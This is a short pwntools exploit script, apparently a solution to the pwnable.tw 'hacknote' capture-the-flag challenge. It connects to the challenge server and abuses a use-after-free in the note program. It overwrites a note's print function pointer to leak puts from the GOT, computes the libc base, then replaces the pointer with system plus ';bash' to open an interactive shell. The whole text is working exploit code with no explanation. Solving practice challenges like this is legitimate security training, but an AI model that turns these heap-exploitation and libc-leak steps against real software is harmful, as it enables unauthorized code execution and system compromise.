from pwn import *

#r = process("./hacknote")
r = remote("chall.pwnable.tw", 10102)
e = ELF("./hacknote")
#l = e.libc
l = ELF("./libc_32.so.6")
context.log_level = "debug"

print_add = 0x0804862B
puts_got_add = e.got['puts']
puts_off = l.sym['puts']
system_off = l.sym['system']


def add(size , content) :
    r.sendlineafter("Your choice :", "1")
    r.sendlineafter("Note size :", str(size))
    r.sendlineafter("Content :", str(content))


def delete(index) :
    r.sendlineafter("Your choice :", "2")
    r.sendlineafter("Index :", str(index))


def show(index) :
    r.sendlineafter("Your choice :", "3")
    r.sendlineafter("Index :", str(index))




add(24, "AAAA")
add(24, "BBBB")
delete(0)
delete(1)
pay = p32(print_add) + p32(puts_got_add)
add(8, pay)
show(0)
leak = u32(r.recv(4))

libc_base = leak - puts_off
system_add = libc_base + system_off

log.info("leak = " + hex(leak))
log.info("libc_base = " + hex(libc_base))
log.info("system_add = " + hex(system_add))

pay = p32(system_add) + ";bash"
delete(2)
add(9, pay)
show(0)
r.interactive()